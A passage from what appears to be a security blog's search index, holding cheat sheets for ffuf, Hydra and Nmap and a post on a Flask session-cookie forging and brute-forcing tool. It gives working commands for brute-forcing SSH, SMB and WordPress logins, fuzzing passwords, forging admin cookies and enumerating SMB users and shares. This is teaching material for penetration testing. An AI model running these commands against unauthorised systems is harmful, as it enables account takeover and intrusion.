id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge, I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\nBasic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; Final Thoughts Nmap is a versatile and robust tool that adapts to a wide range of use cases, from simple port scans to detailed vulnerability assessments. Keep this cheat sheet handy for quick reference, and remember: the more you practice, the more efficient your scanning workflows will become!\n","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003cp\u003e\u003cstrong\u003eNmap\u003c/strong\u003e (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 